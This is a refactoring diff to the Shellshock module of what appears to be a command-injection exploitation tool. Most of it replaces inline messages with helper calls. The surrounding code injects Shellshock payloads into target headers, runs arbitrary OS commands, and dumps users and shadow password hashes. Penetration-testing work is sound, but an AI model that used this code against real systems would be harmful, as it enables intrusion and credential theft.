@@ -80,8 +80,7 @@ Enumeration Options
 def enumeration(url, cve, check_header, filename):
   _ = False
   if menu.options.hostname:
-    info_msg = "Fetching hostname."
-    print(settings.print_info_msg(info_msg))
+    checks.print_enumenation().hostname_msg()
     cmd = settings.HOSTNAME
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
@@ -89,8 +88,7 @@ def enumeration(url, cve, check_header, filename):
     settings.ENUMERATION_DONE = True
 
   if menu.options.current_user:
-    info_msg = "Fetching current user."
-    print(settings.print_info_msg(info_msg))
+    checks.print_enumenation().current_user_msg()
     cmd = settings.CURRENT_USER
     cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if cu_account:
@@ -98,18 +96,17 @@ def enumeration(url, cve, check_header, filename):
     settings.ENUMERATION_DONE = True
 
   if menu.options.is_root:
-    info_msg = "Testing if current user has excessive privileges."
-    print(settings.print_info_msg(info_msg))
+    checks.print_enumenation().check_privs_msg()
     cmd = re.findall(r"" + "\$(.*)", settings.IS_ROOT)
-    cmd = ''.join(cmd).replace("(","").replace(")","")
+    cmd = ''.join(cmd)
+    cmd = checks.remove_parenthesis(cmd)
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
       checks.print_current_user_privs(shell, filename, _)
     settings.ENUMERATION_DONE = True
 
   if menu.options.sys_info:
-    info_msg = "Fetching the underlying operating system information."
-    print(settings.print_info_msg(info_msg))
+    checks.print_enumenation().os_info_msg()
     cmd = settings.RECOGNISE_OS            
     target_os, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if target_os:
@@ -117,30 +114,28 @@ def enumeration(url, cve, check_header, filename):
         cmd = settings.DISTRO_INFO
         distro_name, payload = cmd_exec(url, cmd, cve, check_header, filename)
         if len(distro_name) != 0:
-          target_os = target_os + " " + distro_name
+          target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
         cmd = settings.RECOGNISE_HP
         target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
         checks.print_os_info(target_os, target_arch, filename, _)
     settings.ENUMERATION_DONE = True
 
   if menu.options.users:
-    cmd = settings.SYS_USERS             
-    info_msg = "Fetching content of the file '" + settings.PASSWD_FILE 
-    info_msg += "' in order to enumerate users entries. "  
-    print(settings.print_info_msg(info_msg))
+    checks.print_enumenation().print_users_msg()
+    cmd = settings.SYS_USERS
+    cmd = checks.remove_command_substitution(cmd)
     sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if sys_users:
       checks.print_users(sys_users, filename, _) 
     settings.ENUMERATION_DONE = True
 
   if menu.options.passwords:
-    info_msg = "Fetching content of the file '" + settings.SHADOW_FILE 
-    info_msg += "' in order to enumerate users password hashes. "  
-    print(settings.print_info_msg(info_msg))
-    cmd = settings.SYS_PASSES            
+    checks.print_enumenation().print_passes_msg() 
+    cmd = settings.SYS_PASSES
+    cmd = checks.remove_command_substitution(cmd)         
     sys_passes, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if sys_passes :
-      checks.print_users(sys_users, filename, _)
+      checks.print_passes(sys_passes, filename, _)
     settings.ENUMERATION_DONE = True  
 
 """
@@ -301,7 +296,7 @@ def shellshock_handler(url, http_request_method, filename):
         settings.DETECTION_PHASE = True
         settings.EXPLOITATION_PHASE = False
         i = i + 1
-        attack_vector = "echo" + " " + cve + ":Done;"
+        attack_vector = "echo" + settings.SINGLE_WHITESPACE + cve + ":Done;"
         payload = shellshock_payloads(cve, attack_vector)
 
         # Check if defined "--verbose" option.
@@ -367,7 +362,7 @@ def shellshock_handler(url, http_request_method, filename):
           if settings.VERBOSITY_LEVEL != 0:
             checks.total_of_requests()
 
-          finding = check_header + " " + vuln_parameter
+          finding = check_header + settings.SINGLE_WHITESPACE + vuln_parameter
           # Print the findings to terminal.
           info_msg = finding + " appears to be injectable via " + technique + "."
           if settings.VERBOSITY_LEVEL == 0:
@@ -415,15 +410,9 @@ def shellshock_handler(url, http_request_method, filename):
 
           if menu.options.os_cmd:
             cmd = menu.options.os_cmd 
+            checks.print_enumenation().print_single_os_cmd_msg(cmd)
             shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-            info_msg =  "Executing the user-supplied command: '" + cmd + "'."
-            if shell:
-              print(settings.print_info_msg(info_msg))
-              _ = "'" + cmd + "' execution output"
-              print(settings.print_retrieved_data(_, shell))
-            else:
-              err_msg = "The execution of '" + cmd + "' command does not return any output."
-              print(settings.print_error_msg(err_msg))
+            checks.print_single_os_cmd(cmd, shell)
 
           try:
             # Pseudo-Terminal shell
